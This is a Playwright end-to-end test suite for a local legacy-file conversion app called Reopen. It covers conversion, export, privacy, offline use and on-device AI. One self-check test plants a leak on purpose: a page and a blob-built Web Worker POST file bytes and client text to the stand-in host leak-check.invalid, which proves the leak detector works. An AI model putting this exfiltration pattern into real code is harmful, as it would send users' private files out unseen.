import { readFileSync } from 'node:fs';
import { chromium, expect, test, type Page } from '@playwright/test';
import { strFromU8, unzipSync } from 'fflate';
import {
  AI_HOSTS,
  card,
  declineConsentEveryWay,
  leakProblems,
  oldFolderEntries,
  openApp,
  recordRequests,
  researcherStatus,
  SAMPLE_DIR,
  SAMPLE_ZIP,
  TEN_SECOND_LINE,
  waitForFinished,
} from './helpers';
import { mockFirebase } from './firebase-mock';
import { CONFIGURED_URL, HOSTED } from './servers';

/*
 * Reopen end to end, in Google Chrome. These tests never click "Wake on-device AI" (that would
 * start a multi-gigabyte download) and never confirm a cloud call: the researcher tests stop at
 * the consent dialog and cancel.
 */

const ENTRIES = oldFolderEntries();
const SAMPLE_COUNT = ENTRIES.length; // 15 files in OLDPC/

async function rescueSampleFolder(page: Page): Promise<string> {
  await page.getByRole('button', { name: 'Try the sample folder' }).click();
  await expect(page.locator('#results')).toBeVisible();
  return waitForFinished(page);
}

/** Checks the library after a full run over the sample folder (whichever way it came in). */
async function expectSampleLibrary(page: Page, prefix = 'OLDPC/'): Promise<void> {
  await expect(page.locator('#count-device')).toHaveText(String(SAMPLE_COUNT));
  await expect(page.locator('#count-cloud')).toHaveText('0');
  await expect(page.locator('#library article.card')).toHaveCount(SAMPLE_COUNT);
  for (const entry of ENTRIES) {
    const path = prefix + entry.appPath.slice('OLDPC/'.length);
    const item = card(page, path);
    await expect(item, `card for ${path}`).toHaveCount(1);
    for (const phrase of entry.mystery ? [] : (entry.includes ?? [])) {
      await expect(item, `${path} shows "${phrase}"`).toContainText(phrase);
    }
  }
  // No step in a rescue runs in the cloud.
  await expect(page.locator('#library .badge-cloud')).toHaveCount(0);
  await expect(page.locator('#ledger-root')).toContainText('0 cloud calls this session.');
}

test.describe('app shell', () => {
  test('loads with the 10-second line, zeroed counters, licence and no errors', async ({ page }) => {
    const { pageErrors } = await openApp(page);
    await expect(page).toHaveTitle(/Reopen/);
    await expect(page.getByRole('heading', { level: 1 })).toHaveText(TEN_SECOND_LINE);
    await expect(page.locator('#count-device')).toHaveText('0');
    await expect(page.locator('#count-cloud')).toHaveText('0');
    await expect(page.locator('#count-skipped')).toHaveText('0');
    await expect(page.locator('#net-status')).toHaveText('Online');
    await expect(page.locator('footer')).toContainText('Apache-2.0');
    await expect(page.locator('footer a[href="https://github.com/sarthak-1111/reopen"]')).toBeVisible();
    // Chrome has the File System Access API, so the real folder picker is offered.
    await expect(page.getByRole('button', { name: 'Choose a folder' })).toBeVisible();
    await expect(page.locator('#folder-input-label')).toBeHidden();
    await expect(page.locator('#results')).toBeHidden();
    // The Nano chip shows one of the known states (never asks for anything by itself).
    await expect(page.locator('#nano-status .nano-label strong')).toHaveText(
      /^(On-device AI ready|On-device AI available|On-device AI downloading|On-device AI not supported here|No on-device AI in this browser|On-device AI not set up)$/,
    );
    expect(pageErrors).toEqual([]);
  });

  test('keyboard: the first Tab reaches the skip link, which moves focus to the main content', async ({ page }) => {
    await openApp(page);
    await page.keyboard.press('Tab');
    await expect(page.locator('.skip-link')).toBeFocused();
    await page.keyboard.press('Enter');
    await expect(page.locator('#main')).toBeFocused();
  });

  test('phone width: no horizontal scrolling, before and after a rescue', async ({ page }) => {
    await page.setViewportSize({ width: 360, height: 780 });
    await openApp(page);
    const overflow = () => page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
    expect(await overflow()).toBeLessThanOrEqual(0);
    await rescueSampleFolder(page);
    expect(await overflow()).toBeLessThanOrEqual(0);
  });
});

test.describe('rescue', () => {
  test('sample folder: every file is detected, converted on this device and shown', async ({ page }) => {
    const { pageErrors } = await openApp(page);
    const finished = await rescueSampleFolder(page);
    expect(finished).toContain(`of ${SAMPLE_COUNT} files rescued on this device`);
    expect(finished).toContain('Cloud calls: 0.');
    await expectSampleLibrary(page);

    // Detection by structure, not by extension: misleading names are still recognised.
    await expect(card(page, 'OLDPC/STOCK.DAT').locator('dl.facts')).toContainText(/Excel/i);
    await expect(card(page, 'OLDPC/STATUS.DOC').locator('dl.facts')).toContainText(/WordPerfect/i);
    await expect(card(page, 'OLDPC/LEDGER.DAT').locator('dl.facts')).toContainText(/EBCDIC/i);
    // Legacy encodings are named on the card.
    await expect(card(page, 'OLDPC/MEMO1.TXT').locator('dl.facts')).toContainText(/Shift[-_ ]?JIS/i);
    await expect(card(page, 'OLDPC/NOTICE.TXT').locator('dl.facts')).toContainText(/EUC-JP/i);
    // The mystery format is not invented: it is left unconverted.
    await expect(card(page, 'OLDPC/NOTEBOOK/GARDEN.QNB').locator('.chip').first()).toHaveText('Not converted');
    // The file list shows a final state for every file.
    await expect(page.locator('#file-list .file-status[data-status="Done"]')).toHaveCount(SAMPLE_COUNT);
    // Every card offers at least one download, except the mystery file.
    for (const entry of ENTRIES.filter((e) => !e.mystery)) {
      await expect(card(page, entry.appPath).locator('ul.downloads a[download]').first()).toBeVisible();
    }
    expect(pageErrors).toEqual([]);
  });

  test('export: one zip with the converted files, index.html catalogue and Rescue Report', async ({ page }, testInfo) => {
    await openApp(page);
    await rescueSampleFolder(page);
    const exportButton = page.getByRole('button', { name: 'Download everything (.zip)' });
    await expect(exportButton).toBeEnabled();
    const [download] = await Promise.all([page.waitForEvent('download'), exportButton.click()]);
    expect(download.suggestedFilename()).toMatch(/^Reopen .*\.zip$/);
    const saved = testInfo.outputPath('export.zip');
    await download.saveAs(saved);
    const zip = unzipSync(new Uint8Array(readFileSync(saved)));
    const names = Object.keys(zip);

    expect(names).toContain('index.html');
    expect(names).toContain('RESCUE_REPORT.md');
    const report = strFromU8(zip['RESCUE_REPORT.md']!);
    expect(report).toContain(`Files processed on this device: ${SAMPLE_COUNT}. Cloud calls: 0.`);
    const catalogue = strFromU8(zip['index.html']!);
    for (const entry of ENTRIES) expect(catalogue, `catalogue lists ${entry.appPath}`).toContain(entry.appPath);

    // Converted outputs: DOCX, Markdown, CSV and PNG are all present.
    const outputs = names.filter((name) => name.startsWith('files/'));
    for (const ext of ['.docx', '.md', '.csv', '.png']) {
      expect(outputs.some((name) => name.toLowerCase().endsWith(ext)), `an exported ${ext}`).toBe(true);
    }
    // Every known phrase from every sample survives into an exported text file; nothing is invented.
    const text = outputs
      .filter((name) => /\.(md|csv|txt)$/i.test(name))
      .map((name) => strFromU8(zip[name]!))
      .join('\n');
    for (const entry of ENTRIES.filter((e) => !e.mystery)) {
      for (const phrase of entry.includes ?? []) expect(text, `${entry.appPath}: "${phrase}" exported`).toContain(phrase);
      for (const phrase of entry.excludes ?? []) expect(text, `${entry.appPath}: "${phrase}" must not be exported`).not.toContain(phrase);
    }
  });

  test('zip upload: the same folder as a .zip gives the same library', async ({ page }) => {
    await openApp(page);
    await page.locator('#zip-input').setInputFiles(SAMPLE_ZIP);
    const finished = await waitForFinished(page);
    expect(finished).toContain(`of ${SAMPLE_COUNT} files rescued on this device`);
    await expectSampleLibrary(page);
  });

  test('drag and drop of a .zip onto the drop zone', async ({ page }) => {
    await openApp(page);
    const base64 = readFileSync(SAMPLE_ZIP).toString('base64');
    await page.evaluate((b64) => {
      const bytes = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
      const data = new DataTransfer();
      data.items.add(new File([bytes], 'old-folder.zip', { type: 'application/zip' }));
      const zone = document.getElementById('dropzone')!;
      zone.dispatchEvent(new DragEvent('dragenter', { dataTransfer: data, bubbles: true, cancelable: true }));
      zone.dispatchEvent(new DragEvent('drop', { dataTransfer: data, bubbles: true, cancelable: true }));
    }, base64);
    await waitForFinished(page);
    await expectSampleLibrary(page);
  });

  test('classic folder input (the fallback for browsers without the folder picker)', async ({ page }) => {
    await openApp(page);
    // Hidden in Chrome (the File System Access picker is used instead), but still wired up.
    await page.locator('#folder-input').setInputFiles(SAMPLE_DIR);
    const finished = await waitForFinished(page);
    expect(finished).toContain(`of ${SAMPLE_COUNT} files rescued on this device`);
    await expectSampleLibrary(page, 'old-folder/');
  });

  test('start over clears the library and the counters', async ({ page }) => {
    await openApp(page);
    await rescueSampleFolder(page);
    await page.getByRole('button', { name: 'Start over' }).click();
    await expect(page.locator('#results')).toBeHidden();
    await expect(page.locator('#library article')).toHaveCount(0);
    await expect(page.locator('#count-device')).toHaveText('0');
  });
});

test.describe('privacy', () => {
  test('network guard: a full rescue and export send no file bytes or text anywhere, and call no AI endpoint', async ({ browser, baseURL }) => {
    // Service workers blocked so that every request is visible to the recorder.
    const context = await browser.newContext({ serviceWorkers: 'block', baseURL: baseURL! });
    const requests = recordRequests(context);
    const page = await context.newPage();
    try {
      await openApp(page);
      await rescueSampleFolder(page);
      await page.locator('#zip-input').setInputFiles(SAMPLE_ZIP);
      await waitForFinished(page);
      const [download] = await Promise.all([page.waitForEvent('download'), page.getByRole('button', { name: 'Download everything (.zip)' }).click()]);
      await download.path();
      await expect(page.locator('#count-cloud')).toHaveText('0');

      const origin = new URL(baseURL!).origin;
      expect(requests.length).toBeGreaterThan(0);
      expect(leakProblems(requests, origin)).toEqual([]);
      // Report what did leave the origin (Firebase App Check / Remote Config on a configured build).
      const external = [...new Set(requests.filter((r) => !r.url.startsWith(origin) && !/^(data|blob):/.test(r.url)).map((r) => `${r.method} ${r.host}`))];
      test.info().annotations.push({ type: 'external requests', description: external.length ? external.join(', ') : 'none' });
      // The local build has no Firebase settings: nothing at all may leave the machine.
      if (!HOSTED) expect(external).toEqual([]);
    } finally {
      await context.close();
    }
  });

  test('network guard self-check: a planted leak (page and Web Worker) is detected', async ({ browser, baseURL }) => {
    // Proves the guard above is not vacuous. The planted requests go to a fake host that is
    // answered locally by Playwright, so nothing leaves this machine.
    const context = await browser.newContext({ serviceWorkers: 'block', baseURL: baseURL! });
    await context.route('https://leak-check.invalid/**', (route) => route.fulfill({ status: 204 }));
    const requests = recordRequests(context);
    const page = await context.newPage();
    try {
      await openApp(page);
      const memo = [...readFileSync(`${SAMPLE_DIR}/MEMO1.TXT`)];
      const phrase = ENTRIES.find((e) => e.appPath === 'OLDPC/CLIENTS.DBF')!.includes![0]!;
      await page.evaluate(
        async ({ memo, phrase }) => {
          await fetch('https://leak-check.invalid/page', { method: 'POST', body: new Uint8Array(memo) });
          const source = `fetch('https://leak-check.invalid/worker', { method: 'POST', body: ${JSON.stringify(phrase)} }).then(() => postMessage('sent'), () => postMessage('failed'));`;
          const worker = new Worker(URL.createObjectURL(new Blob([source], { type: 'text/javascript' })));
          await new Promise((resolve) => worker.addEventListener('message', resolve, { once: true }));
          worker.terminate();
        },
        { memo, phrase },
      );
      const problems = leakProblems(requests, new URL(baseURL!).origin);
      expect(problems.some((p) => p.includes('MEMO1.TXT') && p.includes('leak-check.invalid/page'))).toBe(true);
      expect(problems.some((p) => p.includes(phrase) && p.includes('leak-check.invalid/worker'))).toBe(true);
    } finally {
      await context.close();
    }
  });

  test('without Gemini Nano: deterministic conversion, recovered text labelled raw, no AI badges', async ({ browser, baseURL }) => {
    const context = await browser.newContext({ baseURL: baseURL! });
    await context.addInitScript(() => {
      // Simulate a browser without the Prompt API.
      try {
        delete (globalThis as { LanguageModel?: unknown }).LanguageModel;
      } catch {
        /* ignore */
      }
    });
    const page = await context.newPage();
    try {
      await openApp(page);
      await expect(page.locator('#nano-status .nano-label strong')).toHaveText(/^(No on-device AI in this browser|On-device AI not set up)$/);
      await expect(page.getByRole('button', { name: 'Wake on-device AI' })).toHaveCount(0);
      await rescueSampleFolder(page);
      await expectSampleLibrary(page);
      // Every AI badge on the cards says NO AI; nothing was reconstructed.
      const badges = page.locator('#library .chips .badge');
      await expect(badges).toHaveCount(SAMPLE_COUNT);
      for (const text of await badges.allTextContents()) expect(text).toBe('NO AI');
      await expect(page.locator('#library .reconstruction')).toHaveCount(0);
      // Text-recovery files show their raw text, clearly labelled and open.
      const recovered = page.locator('#library article.card.tone-raw');
      const count = await recovered.count();
      test.info().annotations.push({ type: 'text-recovery cards', description: String(count) });
      for (let i = 0; i < count; i++) {
        const raw = recovered.nth(i).locator('details.raw-text');
        await expect(raw).toHaveAttribute('open', '');
        await expect(raw.locator('summary')).toContainText('Raw recovered text');
        await expect(raw.locator('summary')).toContainText('nothing added');
      }
    } finally {
      await context.close();
    }
  });
});

test.describe('format researcher', () => {
  test('is opt-in: nothing is sent without review and consent; cancelling sends nothing', async ({ page, context }) => {
    const requests = recordRequests(context);
    await openApp(page);
    const root = page.locator('#format-researcher-root');

    if ((await root.getAttribute('data-placeholder')) === 'true') {
      // Build without Firebase AI Logic (no App Check site key): the lane does not exist.
      test.info().annotations.push({ type: 'researcher', description: 'placeholder (AI Logic not configured in this build)' });
      await expect(root).toContainText('not configured in this build');
      await expect(page.locator('#research-doc-text')).toHaveCount(0);
      return;
    }

    test.info().annotations.push({ type: 'researcher', description: 'real panel' });
    await expect(root).toContainText('Never sent:');
    if (await page.getByRole('button', { name: 'Review what will be sent' }).isDisabled()) {
      // Lane off (Remote Config) or offline: the panel says why, and there is no way to send.
      await expect(researcherStatus(page)).toContainText(/switched off|offline|not configured/);
      test.info().annotations.push({ type: 'researcher', description: `lane unusable: ${await researcherStatus(page).textContent()}` });
      return;
    }
    await declineConsentEveryWay(page);
    expect(requests.filter((r) => AI_HOSTS.test(r.host)).map((r) => r.url)).toEqual([]);
  });
});

test.describe('offline', () => {
  test('after one visit, the app and the sample folder work with no network', async ({ page, context }) => {
    await openApp(page);
    // Shown only once this build's service worker is active with everything cached.
    await expect(page.locator('#offline-status')).toHaveText('Ready offline', { timeout: 60_000 });

    await context.setOffline(true);
    const reachable = await page.evaluate(() =>
      fetch(`/precache-manifest.json?probe=${Date.now()}`, { cache: 'no-store' }).then(
        () => 'network',
        () => 'offline',
      ),
    );
    expect(reachable).toBe('offline');
    // The service worker is offline too (its network-first navigation must fall back to the cache).
    const worker = context.serviceWorkers()[0];
    expect(worker, 'service worker running').toBeTruthy();
    const workerReachable = await worker!.evaluate(() =>
      fetch(`/precache-manifest.json?probe=${Date.now()}`, { cache: 'no-store' }).then(
        () => 'network',
        () => 'offline',
      ),
    );
    expect(workerReachable).toBe('offline');

    const response = await page.reload();
    expect(response?.fromServiceWorker()).toBe(true);
    await expect(page.locator('#ledger-root')).toContainText('0 cloud calls this session.');
    await expect(page.locator('#net-status')).toHaveText('Offline: still working on this device');

    const finished = await rescueSampleFolder(page);
    expect(finished).toContain(`of ${SAMPLE_COUNT} files rescued on this device`);
    await expectSampleLibrary(page);

    // The cloud lane says it is unavailable (or does not exist in this build).
    const root = page.locator('#format-researcher-root');
    if ((await root.getAttribute('data-placeholder')) !== 'true') {
      await expect(root.locator('p[role="status"]')).toContainText(/offline|switched off/);
      await expect(page.getByRole('button', { name: 'Review what will be sent' })).toBeDisabled();
    }
    await context.setOffline(false);
  });
});

test.describe('with Gemini Nano', () => {
  // Needs a Chrome user-data directory where Gemini Nano has already been downloaded (see
  // tests/e2e/README.md). Locally it runs against the configured build with Firebase answered by
  // the mock (on-device calls need no network); with E2E_BASE_URL it runs against that URL.
  test('on-device triage and reconstruction: ON DEVICE badges, no cloud calls', async ({ baseURL }) => {
    const profile = process.env.E2E_CHROME_PROFILE;
    test.skip(!profile, 'E2E_CHROME_PROFILE is not set (a Chrome user-data directory with Gemini Nano downloaded)');
    test.setTimeout(15 * 60_000);
    const url = HOSTED ? baseURL! : CONFIGURED_URL;

    const context = await chromium.launchPersistentContext(profile!, {
      channel: 'chrome',
      headless: false,
      baseURL: url,
      ...(HOSTED ? {} : { serviceWorkers: 'block' as const }),
      // Playwright's defaults switch off Chrome components and field trials; the on-device model may need them.
      ignoreDefaultArgs: ['--disable-component-update', '--disable-field-trial-config'],
    });
    const requests = recordRequests(context);
    try {
      if (!HOSTED) await mockFirebase(context, { cloudLane: true });
      const page = context.pages()[0] ?? (await context.newPage());
      await openApp(page);
      const chip = page.locator('#nano-status .nano-label strong');
      const state = (await chip.textContent()) ?? '';
      test.skip(state !== 'On-device AI ready', `Gemini Nano is not ready in this profile (chip says "${state}")`);

      await page.getByRole('button', { name: 'Try the sample folder' }).click();
      await expect(page.locator('#run-status')).toHaveText(/^Finished: /, { timeout: 14 * 60_000 });
      await expectSampleLibrary(page);

      const onDevice = await page.locator('#library .badge-device').count();
      test.info().annotations.push({ type: 'ON DEVICE badges', description: String(onDevice) });
      expect(onDevice).toBeGreaterThan(0);
      // A reconstruction is only shown when the no-invention check passed; otherwise raw text.
      const reconstructions = page.locator('#library .reconstruction');
      for (let i = 0; i < (await reconstructions.count()); i++) {
        await expect(reconstructions.nth(i)).toContainText('No-invention check passed');
      }
      expect(requests.filter((r) => AI_HOSTS.test(r.host)).map((r) => r.url)).toEqual([]);
      expect(leakProblems(requests, new URL(url).origin)).toEqual([]);
    } finally {
      await context.close();
    }
  });
});
